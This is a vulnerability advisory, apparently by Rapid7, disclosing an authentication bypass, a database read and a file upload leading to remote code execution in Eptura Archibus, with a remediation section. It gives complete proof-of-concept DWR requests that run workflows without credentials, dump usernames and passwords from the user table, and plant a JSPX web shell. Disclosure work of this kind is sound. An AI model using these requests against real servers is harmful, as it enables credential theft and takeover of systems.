title: Authentication Bypass, Remote Code Execution, and Database Read in Eptura Archibus (FIXED)
summary: While performing continuous red teaming exercises through Rapid7’s Vector Command service, Rapid7 discovered three new vulnerabilities in Eptura Archibus. A legacy API endpoint could be exploited to bypass authentication and run various functions without authentication (CVSS: 8.6 High). The most serious functions allow for full database read (CVSS: 8.5 High) and an insecure file upload (CVSS: 9.6 Critical). The insecure file upload leads to remote code execution.
body_markdown:
## Overview


While performing continuous red teaming exercises through Rapid7’s


[Vector Command](https://www.rapid7.com/services/continuous-red-team-service/) service, Rapid7 discovered three new vulnerabilities in


[Eptura Archibus](https://eptura.com/our-platform/archibus/) . A legacy API endpoint could be exploited to bypass authentication and run various functions without authentication (


[CVSS: 8.6 High](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N) ). The most serious functions allow for full database read (


[CVSS: 8.5 High](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N) ) and an insecure file upload (


[CVSS: 9.6 Critical](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N) ). The insecure file upload leads to remote code execution.


## Product description


Archibus helps organizations administer and manage their physical buildings, equipment, and real estate from a single central location. Users can track assets, maintenance work orders, real estate lease information, and desk or room reservations.


[According to Eptura](https://eptura.com/news/eptura-momentum/) , in 2023 over 16,000 companies and 40% of the Fortune 500 used Archibus.


## Impact


A malicious actor with network access to the server via HTTP can read secrets and passwords out of the database. They can also run code to execute system commands as ‘NT AUTHORITY/Local Service’ and gain control of the server.


## Credit


This vulnerability was discovered by Marcus Chang, Security Consultant at Rapid7 and is being disclosed in accordance with


[Rapid7's vulnerability disclosure policy](https://www.rapid7.com/security/disclosure/) .


## CVE-2026-107186 - Archibus Authentication Bypass


The Archibus Web Central web application uses Java Direct Web Remoting (DWR) for various API functionality, which allows requests with multiple method calls. The


isPasswordUppercase


method sets a system session in the thread, and the


runWorkflowRule


method gets the set session for authentication. This allows malicious actors to run seemingly any workflow rule without providing authentication. Rapid7 tested the


AbCommonResources-writeHTMLtoFile


and


AbCommonResources-getDataRecords


workflow rules.


### **Technical Analysis**


Most DWR methods require auth and DWR allows you to make multiple calls in a single request by editing the callCount parameter and adding other method parameters to the request.


DWR processes multiple calls in a single batch sequentially on the same thread. The


SecurityServiceImpl.isPasswordUppercase()


method is whitelisted for pre-auth access, and internally calls


loadTableDef()


which sets the core system user session on the thread-local ContextStore:


```text
// SecurityServiceImpl.java - loadTableDef()
private TableDef.ThreadSafe loadTableDef(String projectId, final String tableName) {
Context context = ContextStore.get();
final Project.Immutable project = configManager.findProject(projectId);
UserSession.Immutable coreUserSession = project.loadCoreUserSession();
context.setUserSession(coreUserSession);  // <-- sets privileged session on context
// ...
}
```


DWRWorkflowService.runWorkflowRule()


uses the privileged context set by


isPasswordUppercase


. If


getUserSession()


was invalid, it returns a session timeout, otherwise it continues execution. The end result is the workflow of the users choosing running without the user providing any authentication:


```text
// DWRWorkflowService.java - runWorkflowRule()
ContextCacheable.Immutable targetContext = ContextStore.get().getUserSession();
// ...
if (targetContext == null) {
handleSessionTimeout(workflowRuleName, workflowRuleInputs, result);
return result;
}
```


### **Exploitation**


For exploitation, the scriptSessionId and PROJECT_ID are required. The DWR API requests are in the following format:


```text
POST /archibus/dwr/call/plaincall/single.2.dwr
Content-Type: text/plain
Cookie: DWRSESSIONID=abc


callCount=1
batchId=0
instanceId=0
page=%2F
scriptSessionId=abc/def
c0-scriptName=<SCRIPT_NAME>
c0-methodName=<METHOD_NAME>
c0-id=0
c0-param0=string:<PROJECT_ID>
```


The scriptSessionId can be obtained with this DWR request. The JSESSIONID can be obtained by browsing to


/archibus/login.axvw


:


```text
POST /archibus/dwr/call/plaincall/__System.generateId.dwr HTTP/1.1
Content-Type: text/plain
Cookie: JSESSIONID=<SESSION_ID>callCount=1
batchId=0
instanceId=0
c0-scriptName=__System
c0-methodName=generateId
c0-id=0
page=%2Farchibus%2Flogin.axvw
scriptSessionId=
```


The Project_ID can be obtained with this request:


```text
POST /archibus/dwr/call/plaincall/SecurityService.getProjects.dwr HTTP/1.1
Content-Type: text/plain
Cookie: JSESSIONID=<SESSION_ID>; DWRSESSIONID=abccallCount=1
batchId=1
instanceId=0
nextReverseAjaxIndex=0
c0-scriptName=SecurityService
c0-methodName=getProjects
c0-id=0
page=%2Farchibus%2Flogin.axvw
scriptSessionId=abc/def
```


### **Proof-of-Concept (POC) Example**


#### **Request To Run Workflow Rule Without Authentication**


Obtain a scriptSessionId and the Project_ID. These can be obtained easily by sending a login request from the browser and viewing the request. This request to the DWR endpoint specifies two DWR method calls by specifying the


callCount


parameter as 2. The first method called is the


isPasswordUppercase


method. Its parameters begin with c0 in the POST body. It sets the user session in the context store with


context.setUserSession(coreUserSession)


via


isPasswordUppercase


. The second method called is the


runWorkflowRule


method which uses the context of the core user session which was set by the


isPasswordUppercase


method. Its parameters begin with c1. The end result is that any workflow can be run with the core user session without providing any credentials.


```text
POST /archibus/dwr/call/plaincall/Multiple.2.dwr
Content-Type: text/plain
Cookie: DWRSESSIONID=abc


callCount=2
batchId=0
instanceId=0
page=%2F
scriptSessionId=abc/def
c0-scriptName=SecurityService
c0-methodName=isPasswordUppercase
c0-id=0
c0-param0=string:<PROJECT_ID>
c1-scriptName=workflow
c1-methodName=runWorkflowRule
c1-id=1
c1-param0=string:<RULE_NAME>
c1-param1=Object_Object:{...params...}
c1-param2=null:null"
```


****


**Example Response**


```text
throw 'allowScriptTagRemoting is false.';
//#DWR-REPLY
//#DWR-START#
(function(){
if(!window.dwr)return;
var dwr=window.dwr._[0];
dwr.engine.remote.handleCallback("0","0",false);
dwr.engine.remote.handleCallback("0","1",{code:"executed",detailedMessage:null,executionTime:16,jsonExpression:null,message:"<WORKFLOW_OUTPUT>",output:null,value:null,xmlDocument:null});
})();
//#DWR-END#
```


## CVE-2026-107187 - Archibus Database Read


The


AbCommonResources-getDataRecords


workflow allows users to read any database table, including usernames and passwords. This vulnerability can be chained with the authentication bypass vulnerability to read sensitive data from the database without authentication.


### **Technical Analysis**


Using the earlier auth bypass vulnerability, the


AbCommonResources-getDataRecords


workflow is callable without authentication. This maps to the


ViewHandlers


method that operates on any Archibus-managed table:


```text
// ViewHandlers.java - getDataRecords()
public void getDataRecords(EventHandlerContext context) {
// ...
String restriction = context.getString("restriction");
// ...
String recordSql = dataSource.formatSqlQuery(restriction, sortValues, filterValues, true, false);
}
```


Authenticated users may also be able to send the request without performing the auth bypass. The code checks if a user in the workflow rules security group. An exception is thrown if the user is not. Rapid7 did not check if the workflow request was able to be sent as a standard user.


```text
// WorkflowRulesContainerImpl.java - line 499
public void checkPermission(WorkflowRule.Immutable workflowRule,
ContextCacheable.Immutable context,
String methodName) throws ExceptionBase {
UserAccount.Immutable userAccount = context.findUserSession().getUserAccount();
String ruleKey = workflowRule.getKey();
if (!userAccount.isMemberOfGroup(workflowRule.getSecurityGroup())) {
throw new ExceptionBase("Your account does not belong to the security group...");
} else if (!workflowRule.isActive()) {
throw new ExceptionBase("This rule is not active at your site...");
}
// ...
}
```


### **Proof-of-Concept (POC) Example**


After obtaining a scriptSessionId and the Project_ID, which can be obtained easily by sending a login request from the browser and viewing the request, a malicious actor can leverage the auth bypass vulnerability. They can set the second call in the DWR request for the


AbCommonResources-getDataRecords


workflow. The


afm_users


table can be queried to view usernames and passwords.


#### **Request**


```text
POST /archibus/dwr/call/plaincall/Multiple.2.dwr HTTP/1.1
Host: TARGET
Content-Type: text/plain


callCount=2
batchId=0
instanceId=0
page=%2F
scriptSessionId=abc/def
c0-scriptName=SecurityService
c0-methodName=isPasswordUppercase
c0-id=0
c0-param0=string:<PROJECT_ID>
c1-scriptName=workflow
c1-methodName=runWorkflowRule
c1-id=1
c1-param0=string:AbCommonResources-getDataRecords
c1-param1=Object_Object:{tableName:reference:c1-e1,fieldNames:reference:c1-e2,indexField:reference:c1-e3,indexLevel:reference:c1-e4,indexValue:reference:c1-e5,sortValues:reference:c1-e6,filterValues:reference:c1-e7,restriction:reference:c1-e8,controlId:reference:c1-e9,recordLimit:reference:c1-e10}
c1-e1=string:afm_users
c1-e2=string:['afm_users.user_name', 'afm_users.user_pwd']
c1-e3=string:afm_users.user_name
c1-e4=string:0
c1-e5=string:
c1-e6=string:[]
c1-e7=string:[]
c1-e8=string:1=1
c1-e9=string:control-1
c1-e10=string:10000
c1-param2=null:null
```


#### **Response**


```text
throw 'allowScriptTagRemoting is false.';
//#DWR-REPLY
//#DWR-START#
(function(){
if(!window.dwr)return;
var dwr=window.dwr._[0];
dwr.engine.remote.handleCallback("0","0",false);
dwr.engine.remote.handleCallback("0","1",{code:"executed",detailedMessage:null,executionTime:13,jsonExpression:"{\"primaryKeyIds\":[\"afm_users.user_name\"],\"records\":[{\"afm_users.user_name\":\"PASSWORD\",\"afm_users.user_pwd\":\"PASSWORD\",\"afm_users.user_name.key\":\"PASSWORD\"}]...
```


Below is a snippet of what the request and response looks like on a live system. The


user_name


,


user_pwd


, email, and


role_name


columns are extracted from the


afm_users


table where


role_name


is ‘SYSTEM ADMINISTRATOR (ACP)’.


*Figure 1: Reading Passwords And Emails In User Table b*


## CVE-2026-107188 - Archibus Unrestricted File Upload


The


AbCommonResources-writeHTMLtoFile


workflow writes user-controlled content to disk with a user-controlled file extension and no validation. This allows users to write JSPX code to browsable locations, which will execute when browsed to. This vulnerability can be chained with the auth bypass vulnerability to upload executable code without auth.


### **Technical Analysis**


The


AbCommonResources-writeHTMLtoFile


workflow writes user-controlled content to disk with a user-controlled file extension and no validation:


```text
// ViewHandlers.java - writeHTMLtoFile()
public void writeHTMLtoFile(EventHandlerContext context) {
String htmlDoc = (String) context.getParameter("html");          // attacker controls content
String extension = (String) context.getParameter("fileExtension"); // attacker controls extension
// ...
File outputFile = File.createTempFile("DataViewReport", "." + extension, outputDir);
BufferedWriter xlsOut = new BufferedWriter(new FileWriter(outputFile));
xlsOut.write(htmlDoc);    // writes attacker content to disk
xlsOut.close();
}
```


### **Proof-of-Concept (POC) Example**


#### **Step 1**


Obtain a scriptSessionId and the Project_ID. These can be obtained easily by sending a login request in the browser and viewing the request. This vulnerable workflow can be chained with the auth bypass vulnerability to upload JSPX files without authentication. The server responds with the filename it generated, along with the browsable file path. Browsing to files uploaded with the JSP extension would trigger an authentication redirect. Browsing to files uploaded with the JSPX file extension didn’t force a redirect, so attacker JSPX code could be executed without authentication when browsing to the file.


#### **Request**


```text
POST /archibus/dwr/call/plaincall/Multiple.2.dwr HTTP/1.1
Host: TARGET
Content-Type: text/plain


callCount=2
batchId=0
instanceId=0
page=%2F
scriptSessionId=abc/def
c0-scriptName=SecurityService
c0-methodName=isPasswordUppercase
c0-id=0
c0-param0=string:<PROJECT_ID>
c1-scriptName=workflow
c1-methodName=runWorkflowRule
c1-id=1
c1-param0=string:AbCommonResources-writeHTMLtoFile
c1-param1=Object_Object:{html:reference:c1-e1,fileExtension:reference:c1-e2}
c1-e1=string:<JSPX_WEBSHELL_CONTENT>
c1-e2=string:jspx
c1-param2=null:null
```


The response includes the generated browsable file path.


**Response**


```text
throw 'allowScriptTagRemoting is false.';
//#DWR-REPLY
//#DWR-START#
(function(){
if(!window.dwr)return;
var dwr=window.dwr._[0];
dwr.engine.remote.handleCallback("0","0",false);
dwr.engine.remote.handleCallback("0","1",{code:"executed",detailedMessage:null,executionTime:16,jsonExpression:"{\"exportFileName\":\"\\\/archibus\\\/schema\\\/\\\/per-site\\\/\\\/exportReports\\\/\\\/DataViewReport<TIMESTAMP>.jspx\"}",message:null,output:null,value:null,xmlDocument:null}
```


#### **Step 2**


Browse to the file path.


```text
curl https://TARGET/archibus/schema/per-site/exportReports/DataViewReport<TIMESTAMP>.jspx
```


Rapid7 exploited the vulnerability on a Vector Command customer's server. As a first proof of concept, a JSPX file to print the server time was uploaded.


Figure 2:


*Inserted Java Code To Print Server Time*


## Remediation


Users should update Archibus to version 2025.02 or higher. The vulnerable DWR method used for auth bypass was


[moved to a REST API in version 2025.02](https://knowledge.eptura.com/Archibus/Whats_New_for_Archibus/Revision_History_Overview/Revision_History_for_Archibus_V.2025.02) . Users should sign into their Eptura account to download the Archibus installer.
